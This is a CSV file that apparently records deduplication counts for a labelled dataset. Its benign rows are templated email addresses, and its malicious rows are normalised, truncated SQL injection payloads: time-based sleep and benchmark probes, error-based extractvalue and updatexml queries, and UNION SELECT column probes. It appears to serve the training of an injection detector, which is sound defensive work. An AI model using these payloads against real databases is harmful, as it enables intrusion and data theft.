template,label,original_count,kept,removed
A@A-A.to,0,1,1,0
A@A-A.uk,0,1,1,0
A@A-de-A.pt,0,1,1,0
A@A-deportivo.mx,0,1,1,0
A@A-e-A.bn,0,1,1,0
A@A-f1.jm,0,1,1,0
A@A-photodecor.sj,0,1,1,0
A@A.A.A,0,1,1,0
A@A.A.ad,0,1,1,0
A@A.A.at,0,1,1,0
A@A.A.aw,0,1,1,0
A@A.A.ci,0,1,1,0
A@A.A.co,0,1,1,0
A@A.A.ec,0,1,1,0
A@A.A.es,0,1,1,0
A@A.A.gn,0,1,1,0
A@A.A.gs,0,1,1,0
A@A.A.hk,0,1,1,0
A@A.A.ke,0,1,1,0
A@A.A.li,0,1,1,0
A@A.A.lk,0,1,1,0
A@A.A.ly,0,1,1,0
A@A.A.nf,0,1,1,0
A@A.A.pe,0,1,1,0
A@A.A.th,0,1,1,0
A@A.A.tj,0,1,1,0
A@A.A.tn,0,1,1,0
A@A.ad,0,1,1,0
A@A.ao,0,1,1,0
A@A.ar,0,1,1,0
A@A.au,0,1,1,0
A@A.be,0,1,1,0
A@A.bn,0,1,1,0
A@A.bt,0,1,1,0
A@A.by,0,1,1,0
A@A.ca,0,1,1,0
A@A.cc,0,1,1,0
A@A.cd,0,1,1,0
A@A.cf,0,1,1,0
A@A.ch,0,1,1,0
A@A.cn,0,1,1,0
A@A.dz,0,1,1,0
A@A.eg,0,1,1,0
A@A.fj,0,1,1,0
A@A.fm,0,1,1,0
A@A.gd,0,1,1,0
A@A.gh,0,1,1,0
A@A.gi,0,1,1,0
A@A.gm,0,1,1,0
A@A.gn,0,1,1,0
A@A.gr,0,1,1,0
A@A.gs,0,1,1,0
A@A.hn,0,1,1,0
A@A.ic,0,1,1,0
A@A.ke,0,1,1,0
A@A.la,0,1,1,0
A@A.lk,0,1,1,0
A@A.lu,0,1,1,0
A@A.ly,0,1,1,0
A@A.ma,0,1,1,0
A@A.mc,0,1,1,0
A@A.me,0,1,1,0
A@A.mg,0,1,1,0
A@A.ml,0,1,1,0
A@A.mn,0,1,1,0
A@A.mp,0,1,1,0
A@A.mq,0,1,1,0
A@A.mt,0,1,1,0
A@A.nc,0,1,1,0
A@A.ne,0,1,1,0
A@A.nl,0,1,1,0
A@A.no,0,1,1,0
A@A.nr,0,1,1,0
A@A.nu,0,1,1,0
A@A.pg,0,1,1,0
A@A.py,0,1,1,0
A@A.ro,0,1,1,0
A@A.rs,0,1,1,0
A@A.sh,0,1,1,0
A@A.sl,0,1,1,0
A@A.sn,0,1,1,0
A@A.sv,0,1,1,0
A@A.sy,0,1,1,0
A@A.tc,0,1,1,0
A@A.td,0,1,1,0
A@A.tk,0,1,1,0
A@A.ug,0,1,1,0
A@A.vc,0,1,1,0
A@A.vu,0,1,1,0
A@A.ye,0,1,1,0
A@N.mw,0,1,1,0
A@ac-A.sk,0,1,1,0
A@ajuntamentbarcelona20.gy,0,1,1,0
A@ajuntamentbarcelona2N.tl,0,1,1,0
A@ajuntamentbcn2N.jp,0,1,1,0
A@ajuntamentdebarcelona20.pr,0,1,1,0
A@ajuntamentdebarcelona20.yu,0,1,1,0
A@ajuntamentdebarcelona2N.qa,0,1,1,0
A@albeiteria.es,0,1,1,0
A@alcantarapartners.mt,0,1,1,0
A@alcantarapartners.so,0,1,1,0
A@alojesuweb.in,0,1,1,0
A@aprendeaestudiar.lt,0,1,1,0
A@aridossanchez.mt,0,1,1,0
A@arroyomolinos-A.gq,0,1,1,0
A@aspirantes.gh,0,1,1,0
A@autobuses-A.ph,0,1,1,0
A@autoconstruccion.fi,0,1,1,0
A@automoviles-A.ag,0,1,1,0
A@ballerpoker.kn,0,1,1,0
A@ballerpoker.sh,0,1,1,0
A@baltasarsantos.kn,0,1,1,0
A@baltasarsantos.vu,0,1,1,0
A@barcafedaniss.co,0,1,1,0
A@barnicesuv.th,0,1,1,0
A@barnizultravioleta.jm,0,1,1,0
A@beautifulbody.yu,0,1,1,0
A@bijoubijoudiferente.vg,0,1,1,0
A@biosaludsystems.A,0,1,1,0
A@biosoftware.in,0,1,1,0
A@biosoftware.th,0,1,1,0
A@bloodline.as,0,1,1,0
A@blueberryminiloaf.A.dj,0,1,1,0
A@botilleria.A.ec,0,1,1,0
A@callofduty6.nu,0,1,1,0
A@campanasextractoras.la,0,1,1,0
A@canariasatuaire.lb,0,1,1,0
A@casabolsa43.np,0,1,1,0
A@casadedurcal.bi,0,1,1,0
A@casasdefamosos.zw,0,1,1,0
A@cenitsoria.sb,0,1,1,0
A@chicashumedas.A,0,1,1,0
A@chicashumedas.at,0,1,1,0
A@chinavende.bi,0,1,1,0
A@cienciapolicial.gr,0,1,1,0
A@cincocolores.A,0,1,1,0
A@cincocolores.sd,0,1,1,0
A@cirugiaplasticacordoba.jm,0,1,1,0
A@classroommanager.co,0,1,1,0
A@clubforex.jm,0,1,1,0
A@cocheacoche.fk,0,1,1,0
A@cocteleria.dz,0,1,1,0
A@comerciosaspe.ke,0,1,1,0
A@comerciosaspe.ps,0,1,1,0
A@comerciosdeaspe.A,0,1,1,0
A@comerciosdeaspe.om,0,1,1,0
A@comodepilarse.ye,0,1,1,0
A@costablancarental.ug,0,1,1,0
A@coworkers.tl,0,1,1,0
A@cpanelhost.A.ht,0,1,1,0
A@cpanelhost.A.uz,0,1,1,0
A@cpanelweb.A.ao,0,1,1,0
A@cpanelweb.yu,0,1,1,0
A@creacionesdolcevita.mo,0,1,1,0
A@creacionwebs.bn,0,1,1,0
A@culturalsanpedrocf.dm,0,1,1,0
A@culturalsanpedrocf.ie,0,1,1,0
A@cumbareback.kz,0,1,1,0
A@davidymamen.sa,0,1,1,0
A@davidymamen.tc,0,1,1,0
A@decoaching.is,0,1,1,0
A@deltamarina.ve,0,1,1,0
A@deportechino.an,0,1,1,0
A@designworld.us,0,1,1,0
A@deuxmanagement.jo,0,1,1,0
A@diagnosticoradiologico.A,0,1,1,0
A@diagnosticoradiologico.jm,0,1,1,0
A@directoriogratuito.A,0,1,1,0
A@directoriogratuito.et,0,1,1,0
A@directoriogratuito.kr,0,1,1,0
A@discotecateatre.do,0,1,1,0
A@diseodesoftware.ml,0,1,1,0
A@distritoeste.no,0,1,1,0
A@djbroadcast.A,0,1,1,0
A@docerosas.dk,0,1,1,0
A@elalamorestaurante.pr,0,1,1,0
A@elbauldelosrefranes.pm,0,1,1,0
A@elcarritodelacompra.gw,0,1,1,0
A@eldeseodepecar.kn,0,1,1,0
A@elgrancolisionadordehadrones.gl,0,1,1,0
A@elsentidodelavida.lc,0,1,1,0
A@elsentidodelavida.nc,0,1,1,0
A@enfuerteventura.A.rw,0,1,1,0
A@enmenorca.A.th,0,1,1,0
A@erasmusrooms.bi,0,1,1,0
A@escuelamontessori.zr,0,1,1,0
A@esencialser.mn,0,1,1,0
A@esmeraldas.A.tm,0,1,1,0
A@espaciodelpintor.by,0,1,1,0
A@espaciopintor.my,0,1,1,0
A@esteticadayda.az,0,1,1,0
A@estoespresto.cd,0,1,1,0
A@estudiodeyoga.td,0,1,1,0
A@expozaragozafloral2014.ac,0,1,1,0
A@familiamarino.td,0,1,1,0
A@firstchoicecoffee.gq,0,1,1,0
A@foreignoffice.sa,0,1,1,0
A@fortelingenieria.si,0,1,1,0
A@freemachine.no,0,1,1,0
A@glutenfreespain.lb,0,1,1,0
A@gopersonalfitness.ua,0,1,1,0
A@gopersonaltrainers.nr,0,1,1,0
A@graficascamp.bt,0,1,1,0
A@grupodescansoyhogar.A,0,1,1,0
A@guiapolicial.lt,0,1,1,0
A@hayunmundoahifuera.id,0,1,1,0
A@hiperbarcelona.tl,0,1,1,0
A@hiperespaa.ly,0,1,1,0
A@hotelesymas.cl,0,1,1,0
A@housemovie.id,0,1,1,0
A@housemovie.lk,0,1,1,0
A@ibizasounds.ir,0,1,1,0
A@imarbella.A,0,1,1,0
A@importaproductosespaoles.cs,0,1,1,0
A@indagacion.td,0,1,1,0
A@ingenelec.es,0,1,1,0
A@inmobiliariahangar.vn,0,1,1,0
A@innovaris.fr,0,1,1,0
A@intelethernet.gl,0,1,1,0
A@inversioneolica.lt,0,1,1,0
A@italianmotorvillagesevilla.gd,0,1,1,0
A@italianmotorvillagesevilla.sh,0,1,1,0
A@kayaalicante.sc,0,1,1,0
A@kimkardashian.A.lk,0,1,1,0
A@kpincentives.sa,0,1,1,0
A@lalectura.af,0,1,1,0
A@lasmilyuna.gi,0,1,1,0
A@laspruebascongaseosa.pk,0,1,1,0
A@latiendadecolchones.ec,0,1,1,0
A@lesionesmusculares.pf,0,1,1,0
A@lesionesmusculares.uz,0,1,1,0
A@locuraporno.ar,0,1,1,0
A@logiteclines.rs,0,1,1,0
A@madrid2012.nu,0,1,1,0
A@mailboxrussia.gu,0,1,1,0
A@manzanilladevillafafila.iq,0,1,1,0
A@maquillajeparalabios.ro,0,1,1,0
A@mariposasentudia.je,0,1,1,0
A@marketingmunicipal.bf,0,1,1,0
A@marketingmunicipal.ro,0,1,1,0
A@masqueclases.gn,0,1,1,0
A@maxitienda.be,0,1,1,0
A@maxitienda.ms,0,1,1,0
A@maxitienda.zr,0,1,1,0
A@maxtienda.er,0,1,1,0
A@maxtienda.na,0,1,1,0
A@mayoriasilenciosa.mu,0,1,1,0
A@mccomptables.be,0,1,1,0
A@micaelagriga.mw,0,1,1,0
A@misanimalesdomesticos.jp,0,1,1,0
A@muchachina.tk,0,1,1,0
A@muebemiweb.ke,0,1,1,0
A@muebetuweb.mu,0,1,1,0
A@muevetuweb.pa,0,1,1,0
A@multasdetransito.gf,0,1,1,0
A@multaspendientes.eg,0,1,1,0
A@multibuscador.A.ph,0,1,1,0
A@multireform.tn,0,1,1,0
A@nanogenerador.pr,0,1,1,0
A@naturalchild.so,0,1,1,0
A@noviasteresapalacios.mc,0,1,1,0
A@noviasteresapalacios.mg,0,1,1,0
A@novolardiseno.br,0,1,1,0
A@novolardiseno.ky,0,1,1,0
A@ofertachina.ir,0,1,1,0
A@ofertachina.lb,0,1,1,0
A@onlinegratis.aq,0,1,1,0
A@opticaweb.A,0,1,1,0
A@pablobracamonte.bh,0,1,1,0
A@palmatraducciones.pw,0,1,1,0
A@palodegolf.A.rw,0,1,1,0
A@pasajesaereosbaratos.es,0,1,1,0
A@pasajesaereosbaratos.pm,0,1,1,0
A@permutatucasa.fm,0,1,1,0
A@piaceredelivery.hn,0,1,1,0
A@piaceredelivery.kw,0,1,1,0
A@piaceredelivery.ro,0,1,1,0
A@pisossantcugat.A,0,1,1,0
A@pisossantcugat.iq,0,1,1,0
A@ppmanzanares.nc,0,1,1,0
A@prestigecars.tv,0,1,1,0
A@prestoesesto.hr,0,1,1,0
A@probandoo.kg,0,1,1,0
A@productosgarantizados.uy,0,1,1,0
A@professionalhost.A.ag,0,1,1,0
A@professionalhost.A.cn,0,1,1,0
A@professionalhost.cc,0,1,1,0
A@programaciones.A.sz,0,1,1,0
A@programagestionerp.ai,0,1,1,0
A@puntodevistafotografia.ve,0,1,1,0
A@quadernideilgarda.ci,0,1,1,0
A@quadernideilgarda.pl,0,1,1,0
A@queinvento.cl,0,1,1,0
A@quiromante.A.mg,0,1,1,0
A@redesmilitantes.pg,0,1,1,0
A@restauranteslaespadaa.bg,0,1,1,0
A@ringringrent.rw,0,1,1,0
A@rockefeller.bt,0,1,1,0
A@ropadegolf.gg,0,1,1,0
A@saavedradiaz.A,0,1,1,0
A@sanchezquesada.lc,0,1,1,0
A@sandrasummer.bi,0,1,1,0
A@santacruzdelvoto.vu,0,1,1,0
A@santacruzdelvoto.ws,0,1,1,0
A@seramitex.sv,0,1,1,0
A@serviconlevante.mr,0,1,1,0
A@sexotelefono.mc,0,1,1,0
A@sexplorador.mk,0,1,1,0
A@showcarsmadrid.A.zm,0,1,1,0
A@sierradealcaraz.dj,0,1,1,0
A@sitienesunawebtienesunnegocio.cf,0,1,1,0
A@softwaresaas.bm,0,1,1,0
A@softwaresaas.ec,0,1,1,0
A@soymuyguapa.es,0,1,1,0
A@spainbareback.fm,0,1,1,0
A@stainless.tw,0,1,1,0
A@stockdefotos.bb,0,1,1,0
A@studentrooms.zr,0,1,1,0
A@tartasconamor.in,0,1,1,0
A@teamspanish.bz,0,1,1,0
A@tecnoindomo.ki,0,1,1,0
A@tetdevelocidad.sj,0,1,1,0
A@theroxyblue.A,0,1,1,0
A@theroxyblue.ir,0,1,1,0
A@tiposdedrogas.je,0,1,1,0
A@todobetis.A,0,1,1,0
A@todobetis.gf,0,1,1,0
A@transportesvegasl.et,0,1,1,0
A@ubuybetter.A,0,1,1,0
A@unanuevavisionenortodoncia.tg,0,1,1,0
A@uniovivirtual.nz,0,1,1,0
A@velaconsultores.mx,0,1,1,0
A@velaconsultores.nl,0,1,1,0
A@velazquezlarraaga.dd,0,1,1,0
A@viajesdacapalla.gd,0,1,1,0
A@viajesdacapalla.gq,0,1,1,0
A@viajesdacapalla.pa,0,1,1,0
A@viajesinternacionales.ne,0,1,1,0
A@videotubo.pr,0,1,1,0
A@vilainstal.sv,0,1,1,0
A@vinavilano.gl,0,1,1,0
A@voragolive.kz,0,1,1,0
A@voragolive.vn,0,1,1,0
A@waterflyesp.eh,0,1,1,0
A@xavipetit.it,0,1,1,0
A@zonamodelos.pl,0,1,1,0
HEX,1,1,1,0
HEX A ( @q ),1,1,1,0
HEX A ( @s ),1,1,1,0
"N "" and N = N union all select ""A"", ""81dc9bdb52d04dc20036dbd8313ed055",1,1,1,0
N 'STR'A'STR'81dc9bdb52d04dc20036dbd8313ed055,1,1,1,0
N ( select ( case when ( N = N ) then regexp_substring ( repeat ( left ( crypt_k,1,1,1,0
N ( select ( case when ( N = N ) then regexp_substring ( repeat ( left ( crypt_k,1,1,1,0
N ( select ( case when ( N = N ) then regexp_substring ( repeat ( left ( crypt_k,1,1,1,0
N ( select ( case when ( N = N ) then regexp_substring ( repeat ( right ( char (,1,1,1,0
N ( select ( case when ( N = N ) then regexp_substring ( repeat ( right ( char (,1,1,1,0
N ( select ( case when ( N = N ) then regexp_substring ( repeat ( right ( char (,1,1,1,0
N ) ( select ( case when ( N = N ) then regexp_substring ( repeat ( left ( crypt,1,1,1,0
N ) ( select ( case when ( N = N ) then regexp_substring ( repeat ( left ( crypt,1,1,1,0
N ) ( select ( case when ( N = N ) then regexp_substring ( repeat ( right ( char,1,1,1,0
N ) ( select ( case when ( N = N ) then regexp_substring ( repeat ( right ( char,1,1,1,0
N ) ) ( select ( case when ( N = N ) then regexp_substring ( repeat ( left ( cry,1,1,1,0
N ) ) ( select ( case when ( N = N ) then regexp_substring ( repeat ( right ( ch,1,1,1,0
N ) ) ) ( select ( case when ( N = N ) then regexp_substring ( repeat ( left ( c,1,1,1,0
N ) ) ) ( select ( case when ( N = N ) then regexp_substring ( repeat ( right ( ,1,1,1,0
N ) ) ) A ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N ) ) ) A ( select * from ( select ( sleep ( N ) ) ) A ) and ( ( ( N = N,1,1,1,0
N ) ) ) A sleep ( N ) #,1,1,1,0
N ) ) ) A sleep ( N ) and ( ( ( N = N,1,1,1,0
N ) ) ) and ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N ) ) ) and ( select * from ( select ( sleep ( N ) ) ) A ) and ( ( ( N = N,1,1,1,0
"N ) ) ) and ( select N from ( select count ( * ) ,concat ( HEX, ( select ( elt (",1,1,1,0
"N ) ) ) and ( select N* ( if ( ( select * from ( select concat ( HEX, ( select (",1,1,1,0
"N ) ) ) and A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( select ( elt ( N =",1,1,1,0
N ) ) ) and N = ( select N from pg_sleep ( N ) ) --,1,1,1,0
N ) ) ) and N = ( select N from pg_sleep ( N ) ) and ( ( ( N = N,1,1,1,0
"N ) ) ) and N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A as sys",1,1,1,0
"N ) ) ) and N = ( select count ( * ) from A$A as t1,A$A as t2,A$collations as t3",1,1,1,0
"N ) ) ) and N = ( select count ( * ) from A.A as t1,A.columns as t2,A.tables as ",1,1,1,0
"N ) ) ) and N = ( select count ( * ) from all_users t1,all_users t2,all_users t3",1,1,1,0
"N ) ) ) and N = ( select count ( * ) from generate_series ( N,N ) ) --",1,1,1,0
"N ) ) ) and N = benchmark ( N,md5 ( HEX ) ) #",1,1,1,0
"N ) ) ) and N = benchmark ( N,md5 ( HEX ) ) and ( ( ( N = N",1,1,1,0
"N ) ) ) and N = convert ( A, ( select char ( N ) +char ( N ) +char ( N ) +char (",1,1,1,0
N ) ) ) and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ( N ) ||,1,1,1,0
"N ) ) ) and N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) ) ) --",1,1,1,0
N ) ) ) and N in ( ( char ( N ) +char ( N ) +char ( N ) +char ( N ) +char ( N ) ,1,1,1,0
N ) ) ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring,1,1,1,0
N ) ) ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring,1,1,1,0
N ) ) ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring,1,1,1,0
N ) ) ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring,1,1,1,0
"N ) ) ) and elt ( N = N,sleep ( N ) ) #",1,1,1,0
"N ) ) ) and elt ( N = N,sleep ( N ) ) and ( ( ( N = N",1,1,1,0
"N ) ) ) and exp ( ~ ( select * from ( select concat ( HEX, ( select ( elt ( N = ",1,1,1,0
"N ) ) ) and extractvalue ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,H",1,1,1,0
N ) ) ) and sleep ( N ) #,1,1,1,0
N ) ) ) and sleep ( N ) and ( ( ( N = N,1,1,1,0
"N ) ) ) and updatexml ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,HEX ",1,1,1,0
N ) ) ) or ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N ) ) ) or ( select * from ( select ( sleep ( N ) ) ) A ) and ( ( ( N = N,1,1,1,0
"N ) ) ) or ( select N from ( select count ( * ) ,concat ( HEX, ( select ( elt ( ",1,1,1,0
"N ) ) ) or ( select N* ( if ( ( select * from ( select concat ( HEX, ( select ( ",1,1,1,0
"N ) ) ) or A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( select ( elt ( N = ",1,1,1,0
N ) ) ) or N = ( select N from pg_sleep ( N ) ) --,1,1,1,0
N ) ) ) or N = ( select N from pg_sleep ( N ) ) and ( ( ( N = N,1,1,1,0
"N ) ) ) or N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A as sys4",1,1,1,0
"N ) ) ) or N = ( select count ( * ) from A$A as t1,A$A as t2,A$collations as t3,",1,1,1,0
"N ) ) ) or N = ( select count ( * ) from all_users t1,all_users t2,all_users t3,",1,1,1,0
"N ) ) ) or N = ( select count ( * ) from generate_series ( N,N ) ) --",1,1,1,0
"N ) ) ) or N = benchmark ( N,md5 ( HEX ) ) #",1,1,1,0
"N ) ) ) or N = benchmark ( N,md5 ( HEX ) ) and ( ( ( N = N",1,1,1,0
N ) ) ) or N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ( N ) ||c,1,1,1,0
"N ) ) ) or N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) ) ) --",1,1,1,0
N ) ) ) or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring ,1,1,1,0
N ) ) ) or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring ,1,1,1,0
N ) ) ) or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring ,1,1,1,0
"N ) ) ) or elt ( N = N,sleep ( N ) ) #",1,1,1,0
"N ) ) ) or elt ( N = N,sleep ( N ) ) and ( ( ( N = N",1,1,1,0
"N ) ) ) or exp ( ~ ( select * from ( select concat ( HEX, ( select ( elt ( N = N",1,1,1,0
"N ) ) ) or extractvalue ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,HE",1,1,1,0
N ) ) ) or sleep ( N ) #,1,1,1,0
N ) ) ) or sleep ( N ) and ( ( ( N = N,1,1,1,0
"N ) ) ) or updatexml ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,HEX )",1,1,1,0
N ) ) ) order by N#,1,1,1,0
N ) ) ) order by N--,1,1,1,0
"N ) ) ) procedure A ( extractvalue ( N,concat ( HEX, ( benchmark ( N,md5 ( HEX )",1,1,1,0
"N ) ) ) procedure A ( extractvalue ( N,concat ( HEX, ( benchmark ( N,md5 ( HEX )",1,1,1,0
"N ) ) ) procedure A ( extractvalue ( N,concat ( HEX,HEX, ( select ( case when ( ",1,1,1,0
N ) ) ) union all select null#,1,1,1,0
"N ) ) ) union all select null,null#",1,1,1,0
"N ) ) ) union all select null,null,null#",1,1,1,0
"N ) ) ) union all select null,null,null,null,null,null,null--",1,1,1,0
"N ) ) ) union all select null,null,null,null,null,null--",1,1,1,0
"N ) ) ) union all select null,null,null--",1,1,1,0
"N ) ) ) union all select null,null--",1,1,1,0
N ) ) ) union all select null--,1,1,1,0
N ) ) ) waitfor delay 'STR' and ( ( ( N = N,1,1,1,0
N ) ) ) waitfor delay 'STR'--,1,1,1,0
N ) ) A ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N ) ) A ( select * from ( select ( sleep ( N ) ) ) A ) and ( ( N = N,1,1,1,0
N ) ) A sleep ( N ) #,1,1,1,0
N ) ) A sleep ( N ) and ( ( N = N,1,1,1,0
N ) ) and ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N ) ) and ( select * from ( select ( sleep ( N ) ) ) A ) and ( ( N = N,1,1,1,0
"N ) ) and ( select N from ( select count ( * ) ,concat ( HEX, ( select ( elt ( N",1,1,1,0
"N ) ) and ( select N* ( if ( ( select * from ( select concat ( HEX, ( select ( e",1,1,1,0
"N ) ) and A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( select ( elt ( N = N",1,1,1,0
N ) ) and N = ( select N from pg_sleep ( N ) ) --,1,1,1,0
N ) ) and N = ( select N from pg_sleep ( N ) ) and ( ( N = N,1,1,1,0
"N ) ) and N = ( select count ( * ) from A as sys1,A as sys2,A as sys3,A as sys4,",1,1,1,0
"N ) ) and N = ( select count ( * ) from A$A as t1,A$A as t2,A$collations as t3,A",1,1,1,0
"N ) ) and N = ( select count ( * ) from A.A as t1,A.columns as t2,A.tables as t3",1,1,1,0
"N ) ) and N = ( select count ( * ) from all_users t1,all_users t2,all_users t3,a",1,1,1,0
"N ) ) and N = ( select count ( * ) from generate_series ( N,N ) ) --",1,1,1,0
"N ) ) and N = benchmark ( N,md5 ( HEX ) ) #",1,1,1,0
"N ) ) and N = benchmark ( N,md5 ( HEX ) ) and ( ( N = N",1,1,1,0
"N ) ) and N = convert ( A, ( select char ( N ) +char ( N ) +char ( N ) +char ( N",1,1,1,0
N ) ) and N = dbms_pipe.receive_message ( chr ( N ) ||chr ( N ) ||chr ( N ) ||ch,1,1,1,0
"N ) ) and N = like ( 'STR',upper ( hex ( randomblob ( N/N ) ) ) ) --",1,1,1,0
N ) ) and N in ( ( char ( N ) +char ( N ) +char ( N ) +char ( N ) +char ( N ) + ,1,1,1,0
N ) ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring (,1,1,1,0
N ) ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring (,1,1,1,0
N ) ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring (,1,1,1,0
N ) ) and char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = regexp_substring (,1,1,1,0
"N ) ) and elt ( N = N,sleep ( N ) ) #",1,1,1,0
"N ) ) and elt ( N = N,sleep ( N ) ) and ( ( N = N",1,1,1,0
"N ) ) and exp ( ~ ( select * from ( select concat ( HEX, ( select ( elt ( N = N,",1,1,1,0
"N ) ) and extractvalue ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,HEX",1,1,1,0
N ) ) and sleep ( N ) #,1,1,1,0
N ) ) and sleep ( N ) and ( ( N = N,1,1,1,0
"N ) ) and updatexml ( N,concat ( HEX,HEX, ( select ( elt ( N = N,N ) ) ) ,HEX ) ",1,1,1,0
N ) ) as A where N = N ( select ( case when ( N = N ) then regexp_substring ( re,1,1,1,0
N ) ) as A where N = N ( select ( case when ( N = N ) then regexp_substring ( re,1,1,1,0
N ) ) as A where N = N A ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N ) ) as A where N = N A ( select * from ( select ( sleep ( N ) ) ) A ) --,1,1,1,0
N ) ) as A where N = N A sleep ( N ) #,1,1,1,0
N ) ) as A where N = N A sleep ( N ) --,1,1,1,0
N ) ) as A where N = N and ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N ) ) as A where N = N and ( select * from ( select ( sleep ( N ) ) ) A ) --,1,1,1,0
"N ) ) as A where N = N and ( select N from ( select count ( * ) ,concat ( HEX, (",1,1,1,0
N ) ) as A where N = N and ( select N* ( if ( ( select * from ( select concat ( ,1,1,1,0
"N ) ) as A where N = N and A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( sel",1,1,1,0
N ) ) as A where N = N and N = ( 'STR'|| ( select case N when N then N else N en,1,1,1,0
N ) ) as A where N = N and N = ( select upper ( A ( chr ( N ) ||chr ( N ) ||chr ,1,1,1,0
"N ) ) as A where N = N and N = A.A.sn ( N, ( chr ( N ) ||chr ( N ) ||chr ( N ) |",1,1,1,0
"N ) ) as A where N = N and N = benchmark ( N,md5 ( HEX ) ) #",1,1,1,0
"N ) ) as A where N = N and N = benchmark ( N,md5 ( HEX ) ) --",1,1,1,0
N ) ) as A where N = N and N = cast ( ( chr ( N ) ||chr ( N ) ||chr ( N ) ||chr ,1,1,1,0
"N ) ) as A where N = N and N = convert ( A, ( select char ( N ) +char ( N ) +cha",1,1,1,0
N ) ) as A where N = N and N = dbms_utility.sqlid_to_sqlhash ( ( chr ( N ) ||chr,1,1,1,0
N ) ) as A where N = N and N = utl_inaddr.get_host_address ( chr ( N ) ||chr ( N,1,1,1,0
N ) ) as A where N = N and N in ( ( char ( N ) +char ( N ) +char ( N ) +char ( N,1,1,1,0
"N ) ) as A where N = N and elt ( N = N,sleep ( N ) ) #",1,1,1,0
"N ) ) as A where N = N and elt ( N = N,sleep ( N ) ) --",1,1,1,0
"N ) ) as A where N = N and exp ( ~ ( select * from ( select concat ( HEX, ( sele",1,1,1,0
"N ) ) as A where N = N and extractvalue ( N,concat ( HEX,HEX, ( select ( elt ( N",1,1,1,0
N ) ) as A where N = N and sleep ( N ) #,1,1,1,0
N ) ) as A where N = N and sleep ( N ) --,1,1,1,0
"N ) ) as A where N = N and updatexml ( N,concat ( HEX,HEX, ( select ( elt ( N = ",1,1,1,0
N ) ) as A where N = N or ( select * from ( select ( sleep ( N ) ) ) A ) #,1,1,1,0
N ) ) as A where N = N or ( select * from ( select ( sleep ( N ) ) ) A ) --,1,1,1,0
"N ) ) as A where N = N or ( select N from ( select count ( * ) ,concat ( HEX, ( ",1,1,1,0
N ) ) as A where N = N or ( select N* ( if ( ( select * from ( select concat ( H,1,1,1,0
"N ) ) as A where N = N or A ( N,N ) > ( select count ( * ) ,concat ( HEX, ( sele",1,1,1,0
"N ) ) as A where N = N or N = benchmark ( N,md5 ( HEX ) ) #",1,1,1,0
"N ) ) as A where N = N or N = benchmark ( N,md5 ( HEX ) ) --",1,1,1,0
N ) ) as A where N = N or char ( N ) ||char ( N ) ||char ( N ) ||char ( N ) = re,1,1,1,0
